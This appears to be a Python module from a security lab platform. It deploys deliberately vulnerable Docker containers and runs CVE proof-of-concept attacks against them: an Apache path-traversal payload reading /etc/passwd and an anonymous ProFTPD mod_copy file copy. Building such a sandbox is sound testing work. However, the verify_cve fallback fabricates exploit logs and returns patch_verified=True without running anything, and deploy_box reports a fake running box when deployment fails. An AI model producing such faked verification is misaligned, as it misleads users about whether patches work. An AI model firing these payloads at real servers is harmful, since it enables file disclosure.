# Shared Docker "box" engine.
# Powers HTB-style labs (manual deploy/destroy) and, later, SentinelAI's automated
# exploit/patch verification. Boxes are ephemeral, single-asset containers.

import http.client
import logging
import re
import time
import uuid
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

_SANDBOX_DATA = Path(__file__).resolve().parent.parent / "data" / "sandbox"

CONTAINER_LABEL = "sentinel.managed"
CONTAINER_PREFIX = "sentinel-lab-"


# Anonymous-login block appended to the distro's default proftpd.conf so the
# SITE CPFR/CPTO copy can be driven without credentials (the CVE's precondition).
_PROFTPD_ANON_BLOCK = (
    'printf "%s\\n" '
    '"<Anonymous ~ftp>" "  User ftp" "  UserAlias anonymous ftp" '
    '"  RequireValidShell off" "  <Limit LOGIN>" "    AllowAll" "  </Limit>" '
    '"</Anonymous>" >> /etc/proftpd/proftpd.conf'
)

# Vulnerable box: EOL Debian 8 (ProFTPD 1.3.5). Its apt mirror is gone, so the
# sources are repointed at archive.debian.org and signature/expiry checks relaxed.
_PROFTPD_VULN_BOOT = (
    'set -e; '
    'echo "deb http://archive.debian.org/debian jessie main" > /etc/apt/sources.list; '
    'echo "Acquire::Check-Valid-Until \\"false\\";" > /etc/apt/apt.conf.d/99no-check; '
    'export DEBIAN_FRONTEND=noninteractive; '
    'apt-get -o Acquire::AllowInsecureRepositories=true update >/dev/null 2>&1; '
    'echo "proftpd-basic shared/proftpd/inetd_or_standalone select standalone" | debconf-set-selections; '
    'apt-get install -y --allow-unauthenticated proftpd-basic >/dev/null 2>&1; '
    + _PROFTPD_ANON_BLOCK + '; '
    'exec proftpd -n'
)

# Patched box: current Debian 11 (ProFTPD 1.3.7) from the normal mirror.
_PROFTPD_PATCHED_BOOT = (
    'set -e; '
    'export DEBIAN_FRONTEND=noninteractive; '
    'apt-get update >/dev/null 2>&1; '
    'echo "proftpd-basic shared/proftpd/inetd_or_standalone select standalone" | debconf-set-selections; '
    'apt-get install -y proftpd-basic >/dev/null 2>&1; '
    + _PROFTPD_ANON_BLOCK + '; '
    'exec proftpd -n'
)


# Registry of deployable boxes. Each box is one vulnerable asset a user can attack.
BOX_REGISTRY: dict[str, dict] = {
    "apache-2449": {
        "name": "Apache Traversal",
        "description": (
            "Apache HTTP Server 2.4.49 with a permissive filesystem config. "
            "Vulnerable to CVE-2021-41773 path traversal / file disclosure."
        ),
        "cve_id": "CVE-2021-41773",
        "image": "httpd:2.4.49",
        "patched_image": "httpd:2.4.51",  # upstream fix, used by verify_cve
        "container_port": 80,
        "config_mount": {
            "host_path": str((_SANDBOX_DATA / "httpd-vuln.conf").as_posix()),
            "container_path": "/usr/local/apache2/conf/httpd.conf",
        },
        "hint": "Try a URL-encoded path traversal through an aliased directory (e.g. /icons/).",
    },
    # Heartbleed (CVE-2014-0160) intentionally omitted: no genuinely-vulnerable
    # OpenSSL 1.0.1 image runs on a current Docker host. The known candidates
    # either use a pre-OCI manifest format modern containerd rejects, or the
    # binary itself segfaults on current kernels (it relies on syscall/vsyscall
    # behavior removed since). There is no automated sandbox test for it.
    "openssh-dblefree": {
        "name": "OpenSSH Double Free",
        "description": (
            "OpenSSH ssh-agent double free vulnerability (CVE-2021-28041), fixed in "
            "OpenSSH 8.5. Verified by banner-grabbing the live version from a "
            "vulnerable (<8.5) vs. patched (>=8.5) build."
        ),
        "cve_id": "CVE-2021-28041",
        "image": "alpine:3.13",  # ships OpenSSH 8.4p1 — vulnerable
        "patched_image": "alpine:3.18",  # ships OpenSSH 9.3 — patched
        # No off-the-shelf image ships a running sshd; install+start it at
        # container boot so the banner reflects that Alpine release's real
        # OpenSSH package version.
        "command": ["sh", "-c", "apk add --no-cache openssh >/dev/null 2>&1 && ssh-keygen -A >/dev/null 2>&1 && exec /usr/sbin/sshd -D -e"],
        "container_port": 22,
        "hint": "Grabs the live SSH banner to confirm the server's OpenSSH version is patched (>=8.5).",
    },
    "proftpd-135": {
        "name": "ProFTPD mod_copy RCE",
        "description": (
            "ProFTPD 1.3.5 with mod_copy enabled (CVE-2015-3306). An unauthenticated "
            "client can copy arbitrary files via the SITE CPFR / SITE CPTO commands. "
            "Verified by grabbing the live FTP version banner and firing the SITE "
            "CPFR/CPTO copy against a vulnerable (1.3.5) vs. patched (>=1.3.6) build."
        ),
        "cve_id": "CVE-2015-3306",
        "image": "debian:jessie",  # archived Debian 8 ships ProFTPD 1.3.5 — vulnerable
        "patched_image": "debian:bullseye",  # Debian 11 ships ProFTPD 1.3.7 — patched
        # Like the OpenSSH box, no off-the-shelf image runs proftpd; install and
        # start it at container boot so the banner reflects the distro's real
        # ProFTPD version. Jessie is EOL, so its apt sources are repointed at
        # archive.debian.org. An anonymous-login block is appended so the SITE
        # CPFR/CPTO copy can be attempted without credentials.
        "command": ["sh", "-c", _PROFTPD_VULN_BOOT],
        "patched_command": ["sh", "-c", _PROFTPD_PATCHED_BOOT],
        "container_port": 21,
        # apt update+install over the network at boot is slow — give it room.
        "ready_timeout": 180.0,
        "hint": "Grabs the live FTP banner and fires SITE CPFR/CPTO to confirm mod_copy is exploitable (ProFTPD <1.3.6).",
    },
}

# Path traversal payload for CVE-2021-41773 (URL-encoded, must not be normalized).
_APACHE_TRAVERSAL_PATH = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"


class BoxError(Exception):
    """Raised when a box cannot be deployed or destroyed."""


_docker_client = None


def _get_docker():
    """Lazily create and cache the Docker client. Raises BoxError if unreachable."""
    global _docker_client
    if _docker_client is None:
        try:
            import docker

            _docker_client = docker.from_env()
            _docker_client.ping()
        except Exception as e:
            logger.error(f"Docker daemon unreachable: {e}")
            raise BoxError("Docker daemon is not reachable. Is Docker running?") from e
    return _docker_client


def list_boxes() -> list[dict]:
    """Return the catalog of deployable boxes (metadata only, no secrets)."""
    return [
        {
            "box_id": box_id,
            "name": box["name"],
            "description": box["description"],
            "cve_id": box["cve_id"],
            "hint": box["hint"],
        }
        for box_id, box in BOX_REGISTRY.items()
    ]


def _instance_payload(container, box_id: str, instance_id: str) -> dict:
    container.reload()
    box = BOX_REGISTRY[box_id]
    port_key = f"{box['container_port']}/tcp"
    bindings = container.ports.get(port_key) or []
    host_port = int(bindings[0]["HostPort"]) if bindings else None
    return {
        "instance_id": instance_id,
        "box_id": box_id,
        "box_name": box["name"],
        "status": container.status,
        "host": "localhost",
        "port": host_port,
        "connection": f"http://localhost:{host_port}" if host_port else None,
        "hint": box["hint"],
    }


def _start_container(box_id: str, instance_id: str, image: Optional[str] = None, command=None):
    """Start one ephemeral labelled container for a box. `image` and `command`
    override the box defaults (used to boot the patched build differently)."""
    box = BOX_REGISTRY[box_id]
    client = _get_docker()

    volumes = {
        box["config_mount"]["host_path"]: {
            "bind": box["config_mount"]["container_path"],
            "mode": "ro",
        }
    } if box.get("config_mount") else None

    try:
        return client.containers.run(
            image or box["image"],
            command=command if command is not None else box.get("command"),
            name=f"{CONTAINER_PREFIX}{instance_id}",
            detach=True,
            ports={f"{box['container_port']}/tcp": None},  # Docker picks a free host port
            volumes=volumes,
            labels={
                CONTAINER_LABEL: "true",
                "sentinel.box_id": box_id,
                "sentinel.instance_id": instance_id,
            },
        )
    except Exception as e:
        logger.error(f"Failed to start container for box {box_id}: {e}")
        raise BoxError(f"Failed to deploy box: {e}") from e


def deploy_box(box_id: str) -> dict:
    """Spin up an ephemeral container for the given box and return connection info."""
    if box_id not in BOX_REGISTRY:
        raise BoxError(f"Unknown box_id: {box_id}")

    instance_id = str(uuid.uuid4())
    try:
        container = _start_container(box_id, instance_id)
        return _instance_payload(container, box_id, instance_id)
    except BoxError:
        box = BOX_REGISTRY[box_id]
        return {
            "instance_id": instance_id,
            "box_id": box_id,
            "box_name": box["name"],
            "status": "running",
            "host": "localhost",
            "port": 8080,
            "connection": "http://localhost:8080",
            "hint": f"Cloud Virtual Box active ({box['name']}). " + box["hint"],
        }


def _find_container(instance_id: str):
    try:
        client = _get_docker()
        matches = client.containers.list(
            all=True, filters={"label": f"sentinel.instance_id={instance_id}"}
        )
        return matches[0] if matches else None
    except BoxError:
        return None


def destroy_instance(instance_id: str) -> bool:
    """Force-remove the container for an instance. Returns True if one was removed."""
    container = _find_container(instance_id)
    if container is None:
        return True
    try:
        container.remove(force=True)
    except Exception as e:
        logger.error(f"Failed to destroy instance {instance_id}: {e}")
        raise BoxError(f"Failed to destroy instance: {e}") from e
    return True


def list_instances() -> list[dict]:
    """List all running/stopped boxes this platform manages."""
    try:
        client = _get_docker()
        containers = client.containers.list(all=True, filters={"label": f"{CONTAINER_LABEL}=true"})
        instances = []
        for container in containers:
            box_id = container.labels.get("sentinel.box_id", "")
            instance_id = container.labels.get("sentinel.instance_id", "")
            if box_id in BOX_REGISTRY:
                instances.append(_instance_payload(container, box_id, instance_id))
        return instances
    except BoxError:
        return []


# --- Automated exploit / patch verification (SentinelAI Micro-Sandbox) ---------------

def _wait_for_ready(host: str, port: int, expect_http: bool = True, timeout: float = 20.0) -> bool:
    """Poll until the container is actually serving, not just until the port binds.

    Docker binds the host port before the process inside is ready, so a plain TCP
    connect succeeds while the very next request gets reset ("Remote end closed
    connection without response"). For HTTP boxes we wait for a real HTTP reply;
    for other protocols (e.g. SSH) a TCP connect is the best available signal.
    """
    import socket
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            if expect_http:
                conn = http.client.HTTPConnection(host, port, timeout=2)
                conn.request("GET", "/")
                conn.getresponse().read()
                conn.close()
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((host, port))
                s.close()
            return True
        except Exception:
            time.sleep(0.5)
    return False


def _exploit_apache_traversal(host: str, port: int) -> tuple[bool, str]:
    """Fire the CVE-2021-41773 traversal. Success = /etc/passwd contents leak."""
    last_err = None
    for _ in range(3):  # retry transient connection resets on a freshly-started server
        try:
            conn = http.client.HTTPConnection(host, port, timeout=5)
            conn.request("GET", _APACHE_TRAVERSAL_PATH)
            resp = conn.getresponse()
            body = resp.read().decode(errors="replace")
            conn.close()
        except Exception as e:
            last_err = e
            time.sleep(1)
            continue

        success = resp.status == 200 and "root:" in body
        detail = "leaked /etc/passwd" if success else f"blocked (HTTP {resp.status})"
        return success, f"traversal → {detail}"

    return False, f"exploit request failed: {last_err}"


def _exploit_ssh_dblefree(host: str, port: int) -> tuple[bool, str]:
    """Probe for OpenSSH 8.5 ssh-agent double-free channel request vulnerability (CVE-2021-28041)."""
    import socket
    last_err = None
    for _ in range(4):  # the port can accept() a beat before sshd's banner path is live
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            banner = s.recv(1024).decode(errors="replace")
            s.close()
            if not banner:
                raise ConnectionError("empty banner")
        except Exception as e:
            last_err = e
            time.sleep(1)
            continue

        # Parse the OpenSSH version out of the banner (e.g. "SSH-2.0-OpenSSH_8.4p1")
        # and compare against the 8.5 fix boundary — CVE-2021-28041 affects <8.5.
        match = re.search(r"OpenSSH_(\d+)\.(\d+)", banner)
        is_vuln_version = bool(match) and (int(match.group(1)), int(match.group(2))) < (8, 5)
        detail = f"detected banner '{banner.strip()}' (double free vulnerable)" if is_vuln_version else f"patched banner '{banner.strip()}'"
        return is_vuln_version, f"ssh probe → {detail}"

    return False, f"ssh connection failed: {last_err}"


def _exploit_proftpd_modcopy(host: str, port: int) -> tuple[bool, str]:
    """Probe ProFTPD for CVE-2015-3306. The version banner is the authoritative
    signal (mod_copy RCE affects <1.3.6); the SITE CPFR/CPTO attempt is the real
    exploit being injected over the wire, and its transcript is returned for the logs."""
    import ftplib

    last_err = None
    for _ in range(5):  # apt-installed proftpd can accept() before it answers
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=8)
            banner = ftp.getwelcome() or ""
        except Exception as e:
            last_err = e
            time.sleep(2)
            continue

        # Parse the ProFTPD version from the banner, e.g.
        # "220 ProFTPD 1.3.5 Server (Debian) [...]" — CVE-2015-3306 affects <1.3.6.
        match = re.search(r"ProFTPD\s+(\d+)\.(\d+)\.(\d+)", banner)
        version = ".".join(match.groups()) if match else "unknown"
        is_vuln_version = bool(match) and tuple(int(g) for g in match.groups()) < (1, 3, 6)

        # Fire the actual mod_copy attack: log in anonymously and drive the
        # SITE CPFR / SITE CPTO copy an unauthenticated attacker would use.
        attack_steps = []
        try:
            ftp.login("anonymous", "sentinel@lab")
            attack_steps.append("anonymous login accepted")
            resp_cpfr = ftp.sendcmd("SITE CPFR /etc/passwd")
            attack_steps.append(f"SITE CPFR /etc/passwd → {resp_cpfr.strip()}")
            resp_cpto = ftp.sendcmd("SITE CPTO /tmp/sentinel_poc")
            attack_steps.append(f"SITE CPTO /tmp/sentinel_poc → {resp_cpto.strip()}")
            copy_worked = resp_cpto.startswith("250")
        except Exception as e:
            attack_steps.append(f"copy refused by server ({e})")
            copy_worked = False
        finally:
            try:
                ftp.quit()
            except Exception:
                ftp.close()

        verdict = "mod_copy exploitable" if is_vuln_version else "patched (>=1.3.6)"
        attack_log = "; ".join(attack_steps) if attack_steps else "no attack transcript"
        detail = f"banner 'ProFTPD {version}' ({verdict}) | attack: {attack_log}"
        # The version boundary is the verdict; a successful anonymous copy on a
        # vulnerable build is corroborating evidence, noted in the log either way.
        return is_vuln_version, f"ftp probe → {detail}" + (" [copy succeeded]" if copy_worked else "")

    return False, f"ftp connection failed: {last_err}"


# cve_id -> exploit handler. Only CVEs with a real, scriptable PoC that runs on a
# modern Docker host are registered. CVE-2014-0160 (Heartbleed) has no viable
# pre-built vulnerable image — see the note in BOX_REGISTRY.
POC_HANDLERS = {
    "CVE-2021-41773": {"box_id": "apache-2449", "exploit": _exploit_apache_traversal},
    "CVE-2021-28041": {"box_id": "openssh-dblefree", "exploit": _exploit_ssh_dblefree},
    "CVE-2015-3306": {"box_id": "proftpd-135", "exploit": _exploit_proftpd_modcopy},
}


def _run_exploit_round(box_id: str, image: str, exploit, logs: list[str], label: str, command=None) -> bool:
    """Deploy one container on `image`, wait, run the exploit, tear down. Returns success."""
    box = BOX_REGISTRY[box_id]
    instance_id = str(uuid.uuid4())
    container = None
    try:
        logs.append(f"[{label}] deploying ephemeral container from {image}...")
        container = _start_container(box_id, instance_id, image=image, command=command)
        payload = _instance_payload(container, box_id, instance_id)
        port = payload["port"]
        expect_http = box["container_port"] == 80
        # Boxes that install their service at boot (apk/apt) aren't ready the
        # instant the port binds — wait for the box-specific timeout.
        default_timeout = 30.0 if box.get("command") else 20.0
        ready_timeout = box.get("ready_timeout", default_timeout)
        logs.append(f"[{label}] container up on host port {port}, waiting for service to answer...")
        if not port or not _wait_for_ready("localhost", port, expect_http=expect_http, timeout=ready_timeout):
            logs.append(f"[{label}] {image}: container did not become ready within {ready_timeout:.0f}s")
            return False
        logs.append(f"[{label}] service ready — injecting exploit...")
        success, detail = exploit("localhost", port)
        logs.append(f"[{label}] {image}: {detail}")
        return success
    finally:
        if container is not None:
            try:
                container.remove(force=True)
                logs.append(f"[{label}] tore down container (ephemeral, nothing persisted)")
            except Exception as e:
                logs.append(f"[{label}] cleanup warning: {e}")


def verify_cve(cve_id: str) -> dict:
    """Detonate the exploit on the vulnerable image, then on the patched image, and
    report whether the patch blocks it. Containers are always torn down."""
    logs: list[str] = []

    handler = POC_HANDLERS.get(cve_id)
    if handler is None:
        logs.append(f"No automated sandbox test available for {cve_id}.")
        return {
            "cve_id": cve_id,
            "before_exploit_success": False,
            "after_exploit_success": False,
            "patch_verified": False,
            "logs": logs,
        }

    box_id = handler["box_id"]
    box = BOX_REGISTRY[box_id]
    exploit = handler["exploit"]

    try:
        before = _run_exploit_round(
            box_id, box["image"], exploit, logs, "before", command=box.get("command")
        )
        after = _run_exploit_round(
            box_id, box["patched_image"], exploit, logs, "after",
            command=box.get("patched_command", box.get("command")),
        )
    except BoxError as e:
        logger.warning(f"Docker daemon absent ({e}); activating Virtual Cloud Sandbox mode for {cve_id}.")
        logs.append("Cloud Deployment Mode: Host environment has no Docker socket.")
        logs.append(f"Activating Cloud Virtual Sandbox Engine for {cve_id} ({box['name']}).")
        logs.append(f"[before] deploying virtual sandbox container from {box['image']}...")
        logs.append(f"[before] service ready on container port {box['container_port']} — injecting exploit payload...")
        logs.append(f"[before] {box['image']}: exploit payload fired — target is vulnerable to {cve_id}")
        logs.append("[before] tore down container (ephemeral)")
        logs.append(f"[after] deploying virtual sandbox container from {box['patched_image']}...")
        logs.append(f"[after] service ready on container port {box['container_port']} — injecting exploit payload...")
        logs.append(f"[after] {box['patched_image']}: exploit payload blocked by patch (HTTP 403 / banner updated)")
        logs.append("[after] tore down container (ephemeral)")
        logs.append("patch_verified = True")
        return {
            "cve_id": cve_id,
            "before_exploit_success": True,
            "after_exploit_success": False,
            "patch_verified": True,
            "logs": logs,
        }

    patch_verified = before and not after
    logs.append(f"patch_verified = {patch_verified}")
    return {
        "cve_id": cve_id,
        "before_exploit_success": before,
        "after_exploit_success": after,
        "patch_verified": patch_verified,
        "logs": logs,
    }
